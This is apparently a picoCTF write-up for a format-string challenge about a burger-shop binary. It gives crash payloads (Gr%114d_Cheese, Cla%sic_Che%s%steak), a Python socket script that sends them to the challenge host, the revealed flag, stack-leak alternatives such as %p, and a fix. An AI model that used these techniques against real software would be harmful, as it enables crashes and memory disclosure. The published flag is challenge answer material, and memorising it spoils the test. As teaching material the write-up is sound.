# Challenge Description
Description: Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Additional details will be available after launching your challenge instance.

## Solution
The provided binary introduces a simulation of a burger restaurant serving two customers, Patrick and Bob. Critically, the program pre-loads the flag from flag.txt into a global buffer and establishes a custom SIGSEGV (Segmentation Fault) signal handler. This handler is designed to print the contents of the flag buffer immediately before the program exits due to a crash.

The core vulnerability lies in how the program handles user input for both customers:

```
// Vulnerable snippet 1
scanf("%s", choice1);
int count = printf(choice1); // User input is the format string!
if (count > 2 * BUFSIZE) { 
    serve_bob(); 
}
...
// Vulnerable snippet 2 (inside serve_bob)
scanf("%s", choice2);
printf(choice2); // User input is the format string again!
```

In both instances, the user-supplied string (choice1, choice2) is passed directly as the first argument to printf. This is a classic format string vulnerability. An attacker can provide format specifiers (like %s, %d, %x, %n) as input, which printf will interpret as commands instead of literal text.

The exploit path is a two-stage process:

Stage 1: Satisfy Patrick: To reach the second vulnerability, we must pass the check count > 2 * BUFSIZE (which is count > 64). The menu for Patrick includes Gr%114d_Cheese. When printf processes this, the %114d specifier instructs it to print an integer (likely junk from the stack) padded with spaces to a minimum width of 114 characters. This easily surpasses the 64-character requirement, and the program proceeds to serve_bob().

Stage 2: Crash for Bob: Bob's menu contains Cla%sic_Che%s%steak. When this is passed to printf(choice2), the %s specifiers instruct printf to pop values from the stack and treat them as pointers (char*) to null-terminated strings. The stack almost certainly contains data that is not a valid pointer, causing printf to attempt to read from an invalid memory address. This triggers a Segmentation Fault (SIGSEGV).

The custom SIGSEGV handler catches this crash, prints the flag as intended, and the challenge is solved.

Steps to Reproduce (Manual)
Connect to the challenge instance: nc mimas.picoctf.net 53816

At the first prompt (for Patrick), send the first payload: Gr%114d_Cheese

At the second prompt (for Bob), send the second payload: Cla%sic_Che%s%steak

The service will crash and the signal handler will print the flag.

Automated Exploit (Python 3)
This script automates the two-stage interaction.

```
#!/usr/bin/env python3
# Minimal script to interact with remote challenge
import socket, time
HOST, PORT = "mimas.picoctf.net", 53816
P1, P2 = b"Gr%114d_Cheese\n", b"Cla%sic_Che%s%steak\n"

def recv_all(s, timeout=5):
    """Helper to receive all buffered data from socket."""
    s.settimeout(0.5)
    end_time = time.time() + timeout
    output = b""
    while time.time() < end_time:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            break
        output += chunk
    return output

with socket.create_connection((HOST, PORT), timeout=8) as s:
    # Receive initial welcome
    print(recv_all(s, 3).decode(errors="ignore"), end="")
    
    # Send payload 1
    s.sendall(P1)
    time.sleep(0.2)
    
    # Receive response and second prompt
    print(recv_all(s, 3).decode(errors="ignore"), end="")
    
    # Send payload 2
    s.sendall(P2)
    
    # Receive the flag
    print(recv_all(s, 4).decode(errors="ignore"), end="")
```
Example Output:
```
$ python3 get_flag_short.py
Welcome to our newly-opened burger place Pico 'n Patty!
Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers:
Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 
Good job! Patrick is happy!
Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop
Enter your recommendation: 
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
## Concepts learnt:
Format String Vulnerabilities: The primary vulnerability. Occurs when user-controlled input is used as the format argument in C functions like printf, sprintf, and snprintf. This can be exploited to read arbitrary memory (using %x, %p, %s), write to arbitrary memory (using %n), or cause a Denial of Service (crash).

Exploiting Custom Signal Handlers: The program's behavior of printing a flag within a SIGSEGV handler creates an alternative "win condition." Instead of achieving code execution, the goal shifts to simply causing a crash in a controlled way.

Program Flow Control: The exploit required understanding and manipulating the program's logic. The printf return value (number of characters printed) was used as a gate (if (count > 64)) to a second part of the program.

Understanding printf Mechanics:

Return Value: printf returns the total number of characters successfully written to the output.

Width Specifiers: Using specifiers like %114d forces printf to pad its output to a minimum width, which directly inflates the return value.

Argument Parsing: printf expects arguments on the stack corresponding to its format specifiers. When specifiers are provided without matching arguments (e.g., %s), printf reads whatever data is currently on the stack, interpreting it as the required type (like a pointer).

Automated Interaction with Sockets: Using Python's socket library to connect to a remote service, send payloads, and receive responses, which is a fundamental skill for remote exploitation.

## Notes:
Why Gr%114d_Cheese works: The %114d format specifier tells printf to print an integer (which it just pulls from the stack) and ensure the total width of that printed number is at least 114 characters, padding with spaces if necessary. The string Gr (2 chars), the padded number (114 chars), and _Cheese (7 chars) add up to 2 + 114 + 7 = 123 characters, which is greater than 64.

Why Cla%sic_Che%s%steak crashes: The multiple %s specifiers tell printf to expect multiple char* pointers on the stack. When it pops a non-pointer value (e.g., the integer 0x41414141) and tries to dereference it (read the string at memory address 0x41414141), the operating system detects an invalid memory access and sends a SIGSEGV signal to the process.

The Obvious Mitigation: The vulnerability exists because the user's string is the format string. The correct, secure code would be printf("%s", choice1);. Here, the format string is static ("%s"), and the user's input is safely passed as an argument to be printed as a string, preventing any format specifiers within it from being interpreted.

Alternative Payloads: While crashing with %s was simplest, an attacker could have used %x or %p to leak data from the stack. For example, a payload like %p-%p-%p-%p would print several values from the stack in hexadecimal, potentially revealing pointers or other sensitive information. The %n specifier could even be used to write to memory, but this is a much more complex exploit that requires knowing a target address. Given the SIGSEGV handler, crashing was the intended solution.

## Resources:

1. https://www.google.com/search?q=https://owasp.org/www-community/vulnerabilities/Format_string_attack
2. https://en.wikipedia.org/wiki/Uncontrolled_format_string
3. https://www.youtube.com/watch?v=aq365yzrTVE
